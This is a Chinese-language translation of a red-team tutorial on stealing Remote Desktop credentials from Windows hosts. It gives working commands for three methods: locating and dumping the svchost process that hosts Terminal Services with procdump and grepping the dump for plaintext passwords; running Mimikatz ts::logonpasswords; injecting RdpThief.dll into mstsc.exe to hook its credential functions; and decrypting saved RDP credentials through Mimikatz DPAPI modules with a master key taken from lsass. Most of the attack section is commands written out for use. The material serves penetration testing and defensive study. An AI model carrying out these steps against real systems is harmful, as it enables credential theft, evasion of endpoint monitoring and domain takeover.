## 转储RDP凭据

本文为翻译文章，原文链接: [此处](#)。

管理员通常使用远程桌面协议 (RDP) 来远程管理 Windows 环境。此外，系统也会开启标准的 RDP 服务，作为允许用户访问其他网络的跳板。尽管该协议被广泛使用，但其安全性和监控措施往往不足。

从红队的角度来看，转储 `lsass` 进程中的凭据可能导致横向移动或接管整个域（如果获取到域管理员账户的凭据）。与 RDP 协议相关的进程也是红队收集凭证的目标。这些进程包括：

1. `svchost.exe`
2. `mstsc.exe`

上述进程可以作为替代选择来检索凭据，而无需直接访问 `lsass` 进程，后者通常是 EDR 产品重点监控的对象。

## svchost

`svchost.exe` 是一个系统进程，可以承载多个服务以节省资源。当用户通过 RDP 连接进行身份验证时，终端服务由 `svchost` 进程托管。

根据 Jonas Lyk 的发现，凭据以明文形式存储在 `svchost` 进程的内存中。然而，查看进程列表会发现存在多个 `svchost` 进程。可以通过以下命令之一识别托管终端服务连接的进程：

- 查询终端服务：
  ```shell
  sc queryex termservice
  ```
  ![svchost Identification – Service Query](#)

- 查询加载了 `rdpcorets.dll` 的任务：
  ```shell
  tasklist /M:rdpcorets.dll
  ```
  ![svchost Identification – RDP Core DLL](#)

- 运行 Netstat：
  ```shell
  netstat -nob | Select-String TermService -Context 1
  ```
  ![svchost Identification – netstat](#)

- 查看进程的内存字符串，密码显示在用户名下方：
  ![Memory Strings](#)

- 使用 Sysinternals 的 `procdump64.exe` 工具通过指定 PID 和输出目录来转储内存：
  ```shell
  procdump64.exe -ma 988 -accepteula C:\Users\pentestlab
  ```
  ![Memory Dumping – Process Dump](#)

- `.dmp` 文件可以传送到另一台主机用于离线分析。通过执行简单的 `grep` 命令可以识别出存储在用户名下方的内存文件中的密码：
  ```shell
  strings -el svchost* | grep Password123 -C3
  ```
  ![Discovery of Password in Memory Dump](#)

虽然上述方法并不完全可靠，因为 `svchost` 进程在什么情况下会维持凭据仍然是未知的。但是，Mimikatz 支持通过以下命令从已存在的 RDP 连接中检索凭据：
```shell
privilege::debug
ts::logonpasswords
```
![Mimikatz – RDP Credentials](#)

## mstsc

当用户打开远程桌面连接应用程序并通过 RDP 协议连接到其他系统时，将创建 `mstsc.exe` 进程。API Hooking 可以用于拦截用户提供的凭据，并将其用于横向移动。Rio Sherri 开发了一个名为 [RdpThief](https://github.com/0x09AL/RdpThief) 的概念验证工具，它试图 hook `mstsc` 进程使用的函数（如 `CredIsMarshaledCredentialW` 和 `CryptProtectMemory`），以检索凭据并将它们写入磁盘上的文件中。该工具的详细信息可以在 MDSec 网站的一篇文章中找到。

从已被入侵且 `mstsc.exe` 正在运行的系统中，需要将 DLL 注入到该进程中：
```shell
SimpleInjector.exe mstsc.exe RdpThief.dll
```
![RdpThief.dll – DLL Injection](#)

一旦用户输入了对目标主机进行身份验证的凭据，这些凭据将被捕获并写入 `C:\temp` 文件夹的文件中。
![CredPrompt](#)

`creds.txt` 文件包含了 IP 地址。如果使用提升的账户，则可以利用这些信息在网络中横向移动甚至提升权限。

Josh Magri 用 C# 重写了该工具，称为 [SharpRDPThief](https://github.com/passthehashbrowns/SharpRDPThief)。与 RdpThief 相比，SharpRDPThief 使用 IPC Server 来接收来自 `mstsc.exe` 进程的凭据。如果 `mstsc.exe` 被终止，Server 将继续运行，并在进程重新启动时再次尝试 Hooking。这解决了 RdpThief 要求进程已经存在的限制。
![SharpRDPThief](#)

## RDP 文件

对于倾向于通过 RDP 连接对特定主机进行多次身份验证的用户，他们可能会保存连接的详细信息以便快速身份验证。这些凭据使用数据保护 API 以加密形式存储在 Windows 的凭据管理器中。
![Credential Manager](#)

Windows 凭据在磁盘上的位置如下：
```shell
C:\Users\username\AppData\Local\Microsoft\Credentials
```
![Windows Credentials Location](#)

该文件可以通过 Mimikatz 二进制文件查看：
```shell
dpapi::cred /in:C:\Users\pentestlab\AppData\Local\Microsoft\Credentials\ACC240EEE479C1B634EC496F9838074B
```
`pbData` 字段包含加密的信息。但是，用于解密的主密钥存储在 `lsass` 中，可以通过执行以下 Mimikatz 模块来检索。`guidMasterKey` 也很重要，因为查询 `lsass` 时可能存在多个条目，需要将 GUID 与主密钥匹配：
```shell
sekurlsa::dpapi
```
![Mimikatz – DPAPI Master Key](#)

再次执行带有主密钥的 `dpapi::cred` 模块将会返回解密内容和以明文形式公开的 RDP 凭据：
```shell
dpapi::cred /in:C:\Users\pentestlab\AppData\Local\Microsoft\Credentials\ACC240EEE479C1B634EC496F9838074B /masterkey:05d8e693421698148d8a4692f27263201f1c65e0b3ac08e3be91ea75f43e71e9b398e2418ba0f0c62ea70a317bdba88f11da3adebd07d65d2b349f933eab85e1
```
![DPAPI – Decrypting Credentials](#)

执行以下命令将提供这些凭据属于哪个服务器的详细信息：
```shell
vault::list
```
![Mimikatz – Vault List](#)

## YouTube

视频演示: [此处](#)

## 参考

- [Jonas Lyk on Twitter](https://twitter.com/jonasLyk)
- [RdpThief GitHub Repository](https://github.com/0x09AL/RdpThief)
- [MDSec Article on RdpThief](https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/)
- [SharpRDPThief GitHub Repository](https://github.com/passthehashbrowns/SharpRDPThief)
- [Josh Magri on Twitter](https://twitter.com/passthehashbrwn)